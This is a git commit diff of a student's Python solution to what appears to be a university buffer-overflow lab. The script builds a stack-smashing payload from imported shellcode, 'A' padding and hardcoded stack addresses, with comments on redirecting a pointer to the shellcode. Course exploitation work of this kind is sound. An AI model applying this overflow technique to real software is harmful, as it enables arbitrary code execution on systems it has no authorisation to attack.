c66cee2e353d39923a8ef0dad0571a5d658c54a4
Libby Cox <libbycox@umich.edu>
2025-04-02 01:21:37 +0000

    Automatic commit by test script for libbycox

--- sol3.py
+++ sol3.py
@@ -3,10 +3,9 @@
 import sys
 
 from shellcode import shellcode
+# shellcode --> up to 2048 --> addr of shellcode --> addr the return addr
+sys.stdout.buffer.write(shellcode + ((2048-54)*b'A') + (0x7ffffff6cd10).to_bytes(8,"little") + (0x7ffffff6d520).to_bytes(8,"little"))
 
-sys.stdout.buffer.write(shellcode + ((2048-54)*b'A') +(0x7ffffff6d520).to_bytes(8,"little") + (0x0000000000401e2b).to_bytes(8,"little"))
-
-#sys.stdout.buffer.write(shellcode + ((0x810-54+8)*b'A')+(0x7ffffff6d520).to_bytes(8,"little"))
 # buf(2048) --> a(8) --> p(8) --> return addr but this return addr is not something we can overwrite
 # instead we can write to p, which is a pointer at the bottom of the stack
 # we are trying to put the return addr into p bc cannot overwrite it like before
